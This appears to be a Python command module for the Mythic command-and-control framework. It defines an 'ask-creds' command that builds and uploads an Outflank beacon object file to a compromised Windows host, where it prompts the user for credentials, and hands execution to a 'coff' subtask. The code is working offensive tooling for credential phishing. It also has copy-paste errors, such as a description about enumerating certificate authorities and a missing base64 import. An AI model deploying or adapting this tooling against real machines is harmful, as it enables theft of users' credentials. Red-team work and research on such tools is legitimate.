from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import json
import binascii
import cmd 
import struct
import os
import subprocess



class OfArg:
    def __init__(self, arg_data, arg_type):
        self.arg_data = arg_data
        self.arg_type = arg_type

def generateWString(arg):
    return OfArg(arg.encode('utf-16le') + b'\x00\x00', 0)

def generateString(arg):
    return OfArg(arg.encode('ascii') + b'\x00', 0)

def generate32bitInt(arg):
    return OfArg(struct.pack('<I', int(arg)), 1)

def generate16bitInt(arg):
    return OfArg(struct.pack('<H', int(arg)), 2)

def dobinarystuff(arg):
    return OfArg(arg)

def SerialiseArgs(OfArgs):
    output_bytes = b''
    for of_arg in OfArgs:
        output_bytes += struct.pack('<I', of_arg.arg_type)
        output_bytes += struct.pack('<I', len(of_arg.arg_data))
        output_bytes += of_arg.arg_data
    return output_bytes

class AskCredsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line)
        self.args = [
            CommandParameter(
                name="reason",
                type=ParameterType.String,
                description="path to change directory to",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=True,
                        default_value=""
                        )
                    ],
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("reason", self.command_line)
        else:
            raise ValueError("Missing arguments")



    

class AskCredsCommand(CommandBase):
    cmd = "ask-creds"
    needs_admin = False
    help_cmd = "ask-creds"
    description = "Enumerate CAs and templates in the AD using Win32 functions (Created by TrustedSec)"
    version = 1
    script_only = True
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    supported_ui_features = []
    author = "@checkymander"
    argument_class = AskCredsArguments
    attackmapping = []
    browser_script = []
    attributes = CommandAttributes(
        builtin=True
    )
    async def create_tasking(self, task: MythicTask) -> MythicTask:
        
        # Get our architecture version
        arch = task.callback.architecture


        if(arch=="x86"):
            raise Exception("BOF's are currently only supported on x64 architectures")


        bof_path = f"/Mythic/mythic/agent_functions/outflank_bofs/ask_creds/ask_creds.{arch}.o"
        if(os.path.isfile(bof_path) == False):
            await self.compile_bof("/Mythic/mythic/agent_functions/outflank_bofs/ask_creds/")

        # Read the COFF file from the proper directory
        with open(bof_path, "rb") as coff_file:
            encoded_file = base64.b64encode(coff_file.read())

        # Upload the COFF file to Mythic, delete after using so that we don't have a bunch of wasted space used
        print("Uploading COFF file")
        file_resp = await MythicRPC().execute("create_file",
                                    task_id=task.id,
                                    file=encoded_file,
                                    delete_after_fetch=True)  
        
        # Create our BeaconPack object to handle the Argument packing
        OfArgs = []
        reason = task.args.get_arg("reason")
        OfArgs.append(generateWString(reason))
        #print("Encoding Args")
        encoded_args = base64.b64encode(SerialiseArgs(OfArgs)).decode()
        #print(encoded_args)
        # Pack our argument into our buffer using BeaconPack (You'll do this multiple times for each parameter)
        #bp.addWstr(task.args.get_arg("path"))

        # Get the final buffer that we're going to pass to the coff command
        #outbuffer = binascii.hexlify(bp.getbuffer()).decode()

        # Delegate the execution to the coff command, passing: 
        #   the file_id from our create_file RPC call
        #   the functionName which in this case is go
        #   the number of arguments we packed which in this task is 1
        #   the argumentData which is the string representation of the hex output provided from bp.getbuffer()
        print("Requesting subtask")
        resp = await MythicRPC().execute("create_subtask_group", tasks=[
            {"command": "coff", "params": {"coffFile":file_resp.response["agent_file_id"], "functionName":"go","arguments": encoded_args, "timeout":"30"}},
            ], 
            subtask_group_name = "coff", parent_task_id=task.id)

        # We did it!
        return task

    async def process_response(self, response: AgentResponse):
        pass

    async def compile_bof(self, bof_path):
        p = subprocess.Popen(["make"], cwd=bof_path)
        p.wait()
        streamdata = p.communicate()[0]
        rc = p.returncode
        if rc != 0:
            raise Exception("Error compiling BOF: " + str(streamdata))
